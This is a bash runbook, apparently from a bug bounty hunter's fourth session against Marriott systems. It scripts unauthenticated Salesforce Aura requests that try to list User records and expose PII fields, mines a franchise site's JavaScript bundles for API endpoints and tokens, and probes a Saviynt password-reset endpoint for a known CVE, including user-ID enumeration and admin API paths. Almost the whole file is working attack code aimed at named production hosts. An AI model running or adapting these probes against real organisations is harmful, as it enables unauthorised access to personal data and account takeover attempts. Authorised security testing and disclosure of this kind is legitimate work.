#!/usr/bin/env bash
# Pi Runbook — Marriott Session 4
# Goal: Salesforce Aura deep investigation (confirmed lead M002) +
#        Franchise transactions JS extraction + Saviynt forgotpassword retry
# Date: 2026-06-22
# Based on: Session 3 results — Aura endpoint confirmed accessible, User schema returned
#
# KEY CONTEXT:
#  - cpp.marriott.com/s/sfsites/aura → GET 200, POST "state":"SUCCESS" on User (4.5MB)
#  - Contact/Account/Lead/Opp → ERROR with 4.3MB (parse needed)
#  - Franchise transactions → SPA catch-all, need JS bundle
#  - Saviynt forgotpassword → HTTP 500 (ambiguous, not clean 404 — try other formats)
#
# Usage: source ~/bug-bounty-hunting-/scripts/marriott-hunt-init.sh
#        bash ~/bug-bounty-hunting-/results/marriott/runbooks/PI-RUNBOOK-marriott-session4.md

# CRITICAL: Export full PATH at start — prevents grep/head/cat "not found" errors
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/gorib/go/bin:/home/gorib/.pdtm/go/bin:/home/gorib/.local/bin

BB="${BB:-$HOME/bug-bounty-hunting-}"
RESULTS="$BB/results/marriott"
OUTDIR="$RESULTS/session4"
mkdir -p "$OUTDIR" "$HOME/hunt"
cd "$HOME/hunt" || exit 1

section() { echo -e "\n\033[1;36m━━━ $* ━━━\033[0m"; }
P() { printf "  https://%s%s: " "$1" "${2:-/}"; curl -sk --max-time 15 -o /dev/null -w "HTTP %{http_code} | %{size_download}B | redir=%{redirect_url}\n" "https://$1${2:-/}"; }

exec > >(tee "$OUTDIR/session4-output.txt") 2>&1
echo "=== Marriott Session 4 — $(date) ==="
echo "Focus: Salesforce Aura deep + Franchise JS + Saviynt retry"
echo ""

# ============================================================
# PHASE A — SALESFORCE AURA DEEP INVESTIGATION
# cpp.marriott.com — confirmed accessible without auth (Session 3)
# User getObjectInfo → SUCCESS 4.5MB
# Now: parse ERROR bodies + try for actual records + SOQL
# ============================================================

section "PHASE A — Salesforce Aura Deep Investigation"

CPP="cpp.marriott.com"

# fwuid extraction — must get from the actual /s/ page (not redirect)
echo "=== A0: Extract fwuid from page source ==="
PAGE=$(curl -skL --max-time 30 "https://$CPP/s/" 2>/dev/null)
echo "  Page size: ${#PAGE} bytes"

# Multiple extraction patterns for fwuid
FWUID=$(echo "$PAGE" | python3 -c "
import sys, re
page = sys.stdin.read()
# Pattern 1: standard JSON key
m = re.search(r'[\"\\x27]fwuid[\"\\x27][:\\s]+[\"\\x27]([A-Za-z0-9_=+/-]{8,})[\"\\x27]', page)
if m: print(m.group(1)); exit()
# Pattern 2: aura context blob
m = re.search(r'fwuid[\":\\s]+([A-Za-z0-9_=+/-]{8,})', page)
if m: print(m.group(1)); exit()
# Pattern 3: URL-encoded in script tag
import urllib.parse
m = re.search(r'fwuid%22%3A%22([A-Za-z0-9_=+%/-]{8,})%22', page)
if m: print(urllib.parse.unquote(m.group(1))); exit()
print('NOT_FOUND')
" 2>/dev/null || echo "NOT_FOUND")
echo "  fwuid: $FWUID"
echo ""

# Save page source for manual inspection
echo "$PAGE" > "$OUTDIR/cpp-s-page.html"
echo "  Full page saved to: $OUTDIR/cpp-s-page.html"
echo "  Script tags in page:"
echo "$PAGE" | grep -oiE '<script[^>]*src="[^"]*"' | head -10

# Use extracted fwuid if found, otherwise try "unknown" (worked in session 3!)
FWUID_PARAM="${FWUID:-unknown}"
echo "  Using fwuid: $FWUID_PARAM"
echo ""

# Helper function for Aura POST
aura_post() {
  local desc="$1" msg_json="$2" outfile="$3"
  local ctx='{"mode":"PROD","fwuid":"'"$FWUID_PARAM"'","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":false}'
  local result
  result=$(curl -sk --max-time 30 \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "message=$msg_json" \
    --data-urlencode "aura.context=$ctx" \
    --data-urlencode "aura.token=undefined" \
    "https://$CPP/s/sfsites/aura" 2>/dev/null)
  
  local state
  state=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('actions',[{}])[0].get('state','non-JSON'))" 2>/dev/null || echo "non-JSON")
  local size=${#result}
  
  echo "  [$desc]: state=$state | ${size}B"
  
  if [ -n "$outfile" ]; then
    echo "$result" > "$outfile"
  fi
  
  # Print first 600 chars of returnValue if SUCCESS
  if [ "$state" = "SUCCESS" ]; then
    echo "    *** SUCCESS — saving full response ***"
    echo "$result" > "${outfile:-$OUTDIR/aura-${desc}.json}"
    echo "$result" | python3 -c "
import sys, json
d = json.load(sys.stdin)
a = d.get('actions',[{}])[0]
rv = a.get('returnValue', {})
print('    returnValue keys:', list(rv.keys())[:20] if isinstance(rv, dict) else str(rv)[:200])
" 2>/dev/null
  fi
  
  # Print error detail if ERROR
  if [ "$state" = "ERROR" ]; then
    echo "$result" | python3 -c "
import sys, json
d = json.load(sys.stdin)
a = d.get('actions',[{}])[0]
errs = a.get('error', [])
if errs:
    print('    ERROR detail:', str(errs[0])[:300])
" 2>/dev/null
  fi
  
  echo "$result"
}

# A1: Parse session 3 ERROR responses (were 4.3MB each — what's in them?)
echo "=== A1: Contact getObjectInfo — parse the 4.3MB ERROR body ==="
CONTACT_RESP=$(curl -sk --max-time 30 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"Contact"}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID_PARAM\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  Contact getObjectInfo: ${#CONTACT_RESP}B"
echo "$CONTACT_RESP" > "$OUTDIR/cpp-contact-getObjectInfo.json"
echo "$CONTACT_RESP" | python3 -c "
import sys, json
d = json.load(sys.stdin)
a = d.get('actions',[{}])[0]
state = a.get('state','?')
print('  state:', state)
errs = a.get('error', [])
if errs:
    print('  error[0] type:', errs[0].get('exceptionType','?'))
    print('  error[0] msg:', str(errs[0].get('message',''))[:200])
rv = a.get('returnValue', None)
if rv:
    print('  returnValue keys:', list(rv.keys())[:10] if isinstance(rv, dict) else str(rv)[:100])
# Is the large size because of background actions?
bg = d.get('context',{})
print('  context keys:', list(bg.keys()) if isinstance(bg, dict) else '?')
print('  total response keys:', list(d.keys()))
" 2>/dev/null

# A2: getObjectInfo on Account (same ERROR pattern)
echo ""
echo "=== A2: Account getObjectInfo — parse large ERROR ==="
ACCT_RESP=$(curl -sk --max-time 30 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"Account"}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID_PARAM\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  Account getObjectInfo: ${#ACCT_RESP}B"
echo "$ACCT_RESP" | python3 -c "
import sys, json
d = json.load(sys.stdin)
a = d.get('actions',[{}])[0]
state = a.get('state','?')
print('  state:', state)
errs = a.get('error', [])
if errs:
    print('  error type:', errs[0].get('exceptionType','?'))
    print('  error msg:', str(errs[0].get('message',''))[:300])
" 2>/dev/null

# A3: Try getRecord on User — need a real User ID
# Salesforce User IDs start with 005. Try known patterns.
echo ""
echo "=== A3: getRecord — attempt to read actual User records ==="
# Get a User ID from the guest user session context first
GUEST_CONTEXT=$(curl -sk --max-time 20 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"aura://HostConfigController/ACTION$getHostConfig","callingDescriptor":"UNKNOWN","params":{}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID_PARAM\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  getHostConfig: ${#GUEST_CONTEXT}B"
echo "$GUEST_CONTEXT" | python3 -c "
import sys, json, re
d = json.load(sys.stdin)
a = d.get('actions',[{}])[0]
state = a.get('state','?')
print('  state:', state)
rv = a.get('returnValue', {})
if isinstance(rv, dict):
    print('  returnValue keys:', list(rv.keys())[:15])
    # Look for userId, user ID, org ID
    text = json.dumps(rv)
    ids = re.findall(r'005[A-Za-z0-9]{12,15}', text)
    orgs = re.findall(r'00D[A-Za-z0-9]{12,15}', text)
    if ids: print('  User IDs found:', ids[:5])
    if orgs: print('  Org IDs found:', orgs[:3])
" 2>/dev/null

# A4: Try getCurrentUserOrGuest — get the guest user's own ID
echo ""
echo "=== A4: getCurrentUserOrGuest — get context User ID ==="
GUEST_USER=$(curl -sk --max-time 20 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"aura://UserProfileMenuController/ACTION$getUserProfile","callingDescriptor":"UNKNOWN","params":{}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID_PARAM\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  getUserProfile: ${#GUEST_USER}B"
echo "$GUEST_USER" | python3 -c "
import sys, json, re
try:
    d = json.load(sys.stdin)
    a = d.get('actions',[{}])[0]
    print('  state:', a.get('state','?'))
    rv = a.get('returnValue', {})
    text = json.dumps(rv)
    ids = re.findall(r'005[A-Za-z0-9]{12,15}', text)
    if ids: print('  User IDs:', ids[:5])
    print('  returnValue preview:', text[:300])
except:
    pass
" 2>/dev/null

# A5: getItems on User — try to enumerate actual User records
echo ""
echo "=== A5: getItems on User — attempt record enumeration ==="
USER_ITEMS=$(curl -sk --max-time 30 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"User","layoutType":"FULL","pageSize":5,"currentPage":0,"sortBy":"Name","sortDirection":"ASC"}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID_PARAM\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  getItems User: ${#USER_ITEMS}B"
echo "$USER_ITEMS" | python3 -c "
import sys, json, re
try:
    d = json.load(sys.stdin)
    a = d.get('actions',[{}])[0]
    state = a.get('state','?')
    print('  state:', state)
    rv = a.get('returnValue', {})
    if state == 'SUCCESS':
        if isinstance(rv, dict):
            print('  *** SUCCESS — returnValue keys:', list(rv.keys())[:10])
            # Look for records / rows
            records = rv.get('records', rv.get('rows', rv.get('items', [])))
            print('  Record count:', len(records) if isinstance(records, list) else 'n/a')
            if isinstance(records, list) and records:
                print('  First record keys:', list(records[0].keys()) if isinstance(records[0], dict) else str(records[0])[:100])
    else:
        errs = a.get('error', [])
        if errs: print('  ERROR:', str(errs[0])[:200])
except Exception as e:
    print('  parse error:', e)
" 2>/dev/null

# A6: Try getRecord with User object using well-known guest user patterns
echo ""
echo "=== A6: getRecord on User ID patterns ==="
# Try to get the community user ID from community settings
COMM_SETTINGS=$(curl -sk --max-time 20 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"aura://CommunityRichTextController/ACTION$getRichText","callingDescriptor":"UNKNOWN","params":{}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID_PARAM\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  getRichText: ${#COMM_SETTINGS}B"

# Also try getNetworkMemberships — sometimes returns user info
NETWORK=$(curl -sk --max-time 20 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"serviceComponent://ui.communities.controller.GuestUserController/ACTION$getGuestUserId","callingDescriptor":"UNKNOWN","params":{}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID_PARAM\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  getGuestUserId: ${#NETWORK}B"
echo "$NETWORK" | python3 -c "
import sys, json, re
try:
    d = json.load(sys.stdin)
    a = d.get('actions',[{}])[0]
    print('  state:', a.get('state','?'))
    rv = a.get('returnValue','')
    print('  returnValue:', str(rv)[:300])
except: pass
" 2>/dev/null

# A7: Try SOQL query via Aura (some misconfigured instances allow this)
echo ""
echo "=== A7: SOQL query via Aura (if allowed) ==="
SOQL_RESP=$(curl -sk --max-time 30 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"apex://CommunityController/ACTION$queryContacts","callingDescriptor":"UNKNOWN","params":{}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID_PARAM\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  SOQL via CommunityController: ${#SOQL_RESP}B"
echo "$SOQL_RESP" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    a = d.get('actions',[{}])[0]
    print('  state:', a.get('state','?'))
    rv = a.get('returnValue','')
    print('  returnValue:', str(rv)[:300])
except: pass
" 2>/dev/null

# A8: Check if REST API /services/data/ is accessible (not expected, but verify)
echo ""
echo "=== A8: REST API accessibility check ==="
for SFPATH in /services/data/ /services/data/v55.0/ /services/data/v55.0/sobjects/ \
              /services/apexrest/ /api/; do
  printf "  %s: " "$SFPATH"
  curl -sk --max-time 10 -o /dev/null -w "HTTP %{http_code} | %{size_download}B\n" "https://$CPP$SFPATH"
done

# A9: Check Salesforce community navigation — exposed menus may reveal object types
echo ""
echo "=== A9: Community navigation / public page content ==="
NAV=$(curl -sk --max-time 30 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"aura://CommunityPageController/ACTION$getPageContent","callingDescriptor":"UNKNOWN","params":{"pageReference":{"type":"standard__namedPage","attributes":{"pageName":"home"}}}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID_PARAM\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  getPageContent home: ${#NAV}B"
echo "$NAV" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    a = d.get('actions',[{}])[0]
    print('  state:', a.get('state','?'))
    rv = a.get('returnValue','')
    print('  returnValue preview:', str(rv)[:400])
except: pass
" 2>/dev/null

# A10: Full User object SUCCESS response analysis (Session 3 — 4.5MB)
echo ""
echo "=== A10: Full User getObjectInfo SUCCESS re-run + analysis ==="
USER_INFO=$(curl -sk --max-time 30 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID_PARAM\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  User getObjectInfo: ${#USER_INFO}B"
echo "$USER_INFO" > "$OUTDIR/cpp-User-getObjectInfo-full.json"
echo "$USER_INFO" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    a = d.get('actions',[{}])[0]
    state = a.get('state','?')
    print('  state:', state)
    rv = a.get('returnValue', {})
    if isinstance(rv, dict):
        print('  returnValue top-level keys:', list(rv.keys()))
        fields = rv.get('fields', {})
        if fields:
            print('  Field count:', len(fields))
            # Show first 10 field names
            fnames = list(fields.keys())[:10]
            print('  Sample fields:', fnames)
            # Check if any field contains PII
            pii_fields = [f for f in fields.keys() if any(p in f.lower() for p in ['email','phone','name','address','ssn','tax','birth'])]
            print('  PII-related fields accessible:', pii_fields[:10])
        child_rels = rv.get('childRelationships', [])
        print('  Child relationships count:', len(child_rels))
except Exception as e:
    print('  parse error:', e)
" 2>/dev/null

# ============================================================
# PHASE B — FRANCHISE TRANSACTIONS JS BUNDLE EXTRACTION
# All paths return 200/7080B (SPA catch-all) — need real API paths
# ============================================================

section "PHASE B — Franchise Transactions JS Analysis"

FT="marriottfranchisetransactions.marriott.com"
echo "Target: $FT"
echo "Status: SPA serving index.html for all paths — extracting JS bundle for real API paths"
echo ""

echo "=== B1: Homepage source analysis ==="
FT_SRC=$(curl -sk --max-time 20 -L "https://$FT/" 2>/dev/null)
echo "  Homepage size: ${#FT_SRC} bytes"
echo "$FT_SRC" > "$OUTDIR/franchisetx-homepage.html"

echo ""
echo "  Technology fingerprints in source:"
for MARKER in angular react vue next __NEXT_DATA__ webpack aspnet viewstate csrf csrf_token csrfToken; do
  echo "$FT_SRC" | grep -qi "$MARKER" && echo "  FOUND: $MARKER"
done

echo ""
echo "  Script tags (JS bundles):"
echo "$FT_SRC" | grep -oiE '<script[^>]*src="[^"]{5,}"' | head -10

echo ""
echo "  Link tags (CSS, manifest):"
echo "$FT_SRC" | grep -oiE '<link[^>]*href="[^"]{5,}"' | head -5

echo ""
echo "  API base URLs in source:"
echo "$FT_SRC" | grep -oiE '(https?://[a-zA-Z0-9._-]+marriott[^"'\'']+|/api/[^"'\'' ]+)' | sort -u | head -20

# B2: Download and mine the main JS bundle
echo ""
echo "=== B2: JS bundle endpoint mining ==="
# Extract JS URLs from source
JSBUNDLE=$(echo "$FT_SRC" | python3 -c "
import sys, re
page = sys.stdin.read()
scripts = re.findall(r'<script[^>]+src=[\"\\x27]([^\"\\x27]+)[\"\\x27]', page, re.I)
for s in scripts:
    if any(k in s.lower() for k in ['main','app','bundle','vendor','chunk']):
        print(s)
" 2>/dev/null | head -5)

if [ -n "$JSBUNDLE" ]; then
  echo "  Main JS bundles found:"
  echo "$JSBUNDLE"
  while IFS= read -r JSURL; do
    [ -z "$JSURL" ] && continue
    # Handle relative URLs
    [[ "$JSURL" != http* ]] && JSURL="https://$FT$JSURL"
    echo ""
    echo "  Mining: $JSURL"
    JS=$(curl -sk --max-time 30 "$JSURL" 2>/dev/null | head -c 500000)
    echo "  Bundle size: ${#JS} bytes"
    
    # Extract API endpoints
    echo "  API endpoints in bundle:"
    echo "$JS" | grep -oiE '"/api/[^"]{3,50}"' | sort -u | head -20
    echo "$JS" | grep -oiE '"/(v[0-9]+|rest|graphql)/[^"]{3,50}"' | sort -u | head -10
    
    # Extract bearer/token patterns
    echo "  Auth patterns:"
    echo "$JS" | grep -oiE '(Authorization|Bearer|api[_-]?key|token)[^"'\'',;\n]{0,50}' | head -5
    
    # Extract domain references
    echo "  Domain refs:"
    echo "$JS" | grep -oiE 'https://[a-zA-Z0-9._-]+marriott[^"'\'', ]{0,80}' | sort -u | head -10
  done <<< "$JSBUNDLE"
else
  echo "  (No named JS bundles in page source)"
  echo "  Page may use inline scripts. Checking for inline API paths..."
  echo "$FT_SRC" | grep -oiE '"/api/[^"]{3,50}"' | sort -u | head -10
  echo "$FT_SRC" | grep -oiE '"/(v[0-9]+|rest|graphql)/[^"]{3,50}"' | sort -u | head -10
fi

# B3: Check /login page source (may differ from catch-all)
echo ""
echo "=== B3: Login page source analysis ==="
LOGIN_SRC=$(curl -sk --max-time 15 "https://$FT/login" 2>/dev/null)
echo "  /login size: ${#LOGIN_SRC} bytes"
if [ "${#LOGIN_SRC}" -lt 8000 ] || [ "${#LOGIN_SRC}" -gt 8000 ]; then
  echo "  DIFFERENT SIZE from catch-all 7080B — this IS the real login page"
  echo "$LOGIN_SRC" | grep -oiE '(action|method|name|id|class)="[^"]{3,40}"' | head -20
  echo "  Form actions:"
  echo "$LOGIN_SRC" | grep -oiE '<form[^>]*action="[^"]{3,80}"' | head -5
  echo "  Input fields:"
  echo "$LOGIN_SRC" | grep -oiE '<input[^>]+(name|id)="[^"]{2,30}"' | head -10
else
  echo "  SAME SIZE as catch-all — SPA is serving index.html for /login too"
fi

# ============================================================
# PHASE C — SAVIYNT FORGOTPASSWORD RETRY
# Session 3: HTTP 500 on both GET and POST
# Try: query params, form-encoded, GET with params, HEAD, different paths
# ============================================================

section "PHASE C — Saviynt Forgotpassword Retry"

SAVIYNT="ssm-marriottms.saviyntcloud.com"
echo "Target: $SAVIYNT"
echo "Status: POST returned 500 (not 200=CVE hit, not 404=patched). Trying variants."
echo ""

echo "=== C1: GET request (some versions use GET not POST) ==="
GET_RESP=$(curl -sk --max-time 15 \
  -w "\nHTTP %{http_code} | %{size_download}B" \
  "https://$SAVIYNT/ECM/maintenance/forgotpasswordstep1?username=admin" 2>/dev/null)
echo "  GET ?username=admin: ${GET_RESP: -20}"

echo ""
echo "=== C2: Form-encoded POST (original CVE report format) ==="
FORM_RESP=$(curl -sk --max-time 15 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin" \
  -w "\nHTTP %{http_code} | %{size_download}B" \
  "https://$SAVIYNT/ECM/maintenance/forgotpasswordstep1" 2>/dev/null)
echo "  Form POST username=admin: ${FORM_RESP: -25}"

echo ""
echo "=== C3: forgotpasswordstep2 (second step — does it skip step 1?) ==="
STEP2=$(curl -sk --max-time 15 -o /dev/null \
  -w "HTTP %{http_code} | %{size_download}B\n" \
  "https://$SAVIYNT/ECM/maintenance/forgotpasswordstep2?id=1")
echo "  forgotpasswordstep2?id=1: $STEP2"

# Try id range on step1
echo ""
echo "=== C4: User enumeration via forgotpasswordstep1?id=N ==="
for ID in 1 2 3 4 5 100 1000; do
  RESP=$(curl -sk --max-time 10 "https://$SAVIYNT/ECM/maintenance/forgotpasswordstep1?id=$ID" 2>/dev/null | wc -c)
  echo "  ?id=$ID: $RESP bytes"
done

echo ""
echo "=== C5: Alternative Saviynt paths ==="
for PATH in \
  /ECM/maintenance/changepassword \
  /ECM/maintenance/adminpassword \
  /ECM/maintenance/resetpassword \
  /ECM/api/v5/user/forgotPassword \
  /ECM/api/v5/user/resetPassword \
  /ECM/api/v5/user/createUser \
  /ECM/api/v5/admin \
  /ECM/api/v5/config \
  /ECM/api/v5/system/health \
  /ECM/api/v5/analytics \
  /ECM/login/forgot \
  /ECM/maintenance/unlock; do
  printf "  %s: " "$PATH"
  curl -sk --max-time 10 -o /dev/null -w "HTTP %{http_code} | %{size_download}B\n" \
    "https://$SAVIYNT$PATH"
done

# ============================================================
# DECISION GATE
# ============================================================

cat << 'DECISION'

━━━ SESSION 4 DECISION GATE ━━━

REPORT IMMEDIATELY if any of:

  Salesforce Aura (Phase A):
  ✓ A5 getItems User → state=SUCCESS with records → CRITICAL (PII exposed to unauthenticated users)
    Report: Salesforce Guest User misconfiguration on cpp.marriott.com — unauthenticated access
    to User records. CVSS ~8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) HackerOne Critical.
  ✓ A6 getRecord → actual User name/email → CRITICAL
  ✓ A10 User field analysis shows PII fields ARE exposed (fields: Email, Phone, MobilePhone) → High
    Even without records, field-level exposure on User object is reportable as Medium.

  What to do with the User getObjectInfo SUCCESS (already confirmed):
  → This IS a finding: Guest User profile has "API Enabled" allowing unauthenticated Aura access.
  → Severity: Medium standalone (schema exposure), High/Critical if records follow.
  → Report status: HOLD until record access tested (A5/A6). If records blocked → submit as Medium.

  Saviynt (Phase C):
  ✓ C1 GET ?username=admin returns 200 → CVE-2022-23855 (try alternative format)
  ✓ C4 user enumeration (different sizes for different IDs) → High
  ✓ C5 any /ECM/api/v5/* returns 200 without auth → CRITICAL

  Franchise Transactions (Phase B):
  ✓ JS bundle mines reveal /api/v1/transactions/{id} → test IDOR
  ✓ Login page reveals SSO endpoint → test SSO bypass

NEXT STEPS based on results:
  - If Salesforce record access confirmed → /report (run triage workflow first)
  - If schema only → document, continue to test record access manually via browser
  - If Saviynt C1/C4 positive → /report (CVE reference + PoC)
  - Always re-run session 5 if no report-ready finding

DECISION
